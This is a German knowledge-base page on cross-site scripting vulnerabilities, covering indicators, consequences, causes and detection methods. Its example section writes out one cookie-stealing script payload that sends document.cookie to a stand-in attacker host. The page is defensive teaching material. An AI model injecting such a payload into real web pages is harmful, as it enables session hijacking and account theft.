---
title: Cross-Site-Scripting-Schwachstellen
description: Unzureichende Eingabevalidierung und Ausgabekodierung erlaubt es Angreifern,
  bösartige Skripte einzuschleusen, die in den Browsern der Nutzer ausgeführt werden.
category:
- Code
- Security
related_problems:
- slug: sql-injection-vulnerabilities
  similarity: 0.7
- slug: log-injection-vulnerabilities
  similarity: 0.55
- slug: session-management-issues
  similarity: 0.55
- slug: authentication-bypass-vulnerabilities
  similarity: 0.55
- slug: error-message-information-disclosure
  similarity: 0.55
- slug: authorization-flaws
  similarity: 0.5
solutions:
- security-hardening-process
- abuse-case-definition
- api-security
- red-teaming
- secure-coding-guidelines
- secure-programming-interfaces
- secure-session-management
- security-tests
- canonicalization
- defense-lines
- dynamic-code-analysis
- fuzz-testing
- input-validation
- negative-testing
- output-encoding
- penetration-tests
- secure-software
- static-code-analysis
- web-application-firewall
layout: problem
lang: de
en_slug: cross-site-scripting-vulnerabilities
---

## Description

Cross-Site-Scripting (XSS)-Schwachstellen entstehen, wenn Webanwendungen es versäumen, Nutzereingaben ordentlich zu validieren oder Ausgaben zu kodieren, was Angreifern erlaubt, bösartige Skripte einzuschleusen, die in den Browsern anderer Nutzer ausgeführt werden. Diese Schwachstellen können zu Session-Hijacking, Datendiebstahl, Verunstaltung oder anderen bösartigen Aktivitäten führen, die im Kontext der Browser-Sitzung des Opfers ausgeführt werden.

## Indicators ⟡

- Nutzereingaben werden ohne ordentliche Kodierung in Webseiten angezeigt
- JavaScript-Code kann über Formularfelder oder URL-Parameter eingeschleust werden
- Dynamische Inhaltsgenerierung ohne Eingabebereinigung
- Clientseitige Datenvalidierung ohne entsprechende serverseitige Validierung
- Nutzergenerierte Inhalte werden ohne Sicherheitsfilterung angezeigt

## Symptoms ▲

- [Probleme im Session-Management](probleme-im-session-management.md)
<br/>  XSS-Angriffe ermöglichen Session-Hijacking durch das Stehlen von Session-Cookies, was direkt die Sitzungssicherheit gefährdet.
- [Datenschutzrisiko](datenschutzrisiko.md)
<br/>  XSS-Schwachstellen erlauben Angreifern, persönliche und sensible Daten aus den Browsern der Nutzer zu stehlen, was Datenschutzverletzungen schafft.
- [Kundenunzufriedenheit](kundenunzufriedenheit.md)
<br/>  Nutzer, die aufgrund von XSS-Angriffen eine Kontokompromittierung oder Datendiebstahl erleben, verlieren das Vertrauen in die Anwendung.
- [Negative Markenwahrnehmung](negative-markenwahrnehmung.md)
<br/>  Die öffentliche Bekanntgabe von XSS-Schwachstellen schädigt den Ruf der Organisation für Sicherheit und Zuverlässigkeit.
- [Erosion des Nutzervertrauens](erosion-des-nutzervertrauens.md)
<br/>  Nutzer, die durch XSS-Angriffe eine Kontokompromittierung erleben, verlieren das Vertrauen in die Anwendung.
- [Rechtsstreitigkeiten](rechtsstreitigkeiten.md)
<br/>  XSS-Schwachstellen, die zu Datenschutzverletzungen oder Kontokompromittierung führen, können rechtliche Schritte betroffener Nutzer auslösen.

## Causes ▼

- [Unerfahrene Entwickler](unerfahrene-entwickler.md)
<br/>  Entwickler ohne Sicherheitswissen verstehen möglicherweise nicht die Notwendigkeit von Eingabevalidierung und Ausgabekodierung.
- [Legacy-Code ohne Tests](legacy-code-ohne-tests.md)
<br/>  Legacy-Code, der ohne Sicherheitstests geschrieben wurde, hat oft keine ordentliche Eingabevalidierung und Ausgabekodierung, die XSS verhindern würde.
- [Qualitätskompromisse](qualitaetskompromisse.md)
<br/>  Wenn Qualitätsstandards gesenkt werden, um Termine einzuhalten, werden Sicherheitspraktiken wie ordentliche Eingabebereinigung übersprungen.
- [Unzureichende Code-Reviews](unzureichende-code-reviews.md)
<br/>  Code-Reviews, die es versäumen, Sicherheitsprobleme zu identifizieren, lassen XSS-anfälligen Code in die Produktion gelangen.

## Detection Methods ○

- **Eingabevalidierungstests:** Testen aller Eingabefelder und Parameter auf Skript-Injektion
- **Ausgabekodierungsanalyse:** Überprüfung, wie Nutzerdaten in Antworten angezeigt und kodiert werden
- **Automatisiertes Sicherheits-Scanning:** Nutzung von Sicherheits-Scannern zur Identifikation potenzieller XSS-Schwachstellen
- **Code-Review auf XSS-Muster:** Überprüfung von Code auf verbreitete XSS-Schwachstellenmuster
- **Content-Security-Policy-Tests:** Verifikation der CSP-Wirksamkeit bei der Verhinderung von Skript-Injektion

## Examples

Eine Blog-Anwendung zeigt Nutzerkommentare direkt in HTML an, ohne Sonderzeichen zu kodieren. Ein Angreifer veröffentlicht einen Kommentar, der `<script>document.location='http://angreifer.com/steal.php?cookie='+document.cookie</script>` enthält, welcher im Browser jedes Besuchers ausgeführt wird und dessen Session-Cookies an den Server des Angreifers sendet. Der Angreifer kann diese Session-Cookies dann nutzen, um Nutzer zu imitieren und auf deren Konten zuzugreifen. Ein weiteres Beispiel betrifft eine Suchfunktion, die den Suchbegriff auf der Ergebnisseite wie "Ergebnisse für: [Nutzereingabe]" anzeigt. Ein Angreifer erstellt eine bösartige URL mit JavaScript im Suchparameter. Wenn Opfer auf den Link klicken, wird das Skript ausgeführt und kann Aktionen im Namen des Nutzers ausführen, wie das Ändern von Kontoeinstellungen oder das Vornehmen unbefugter Transaktionen.
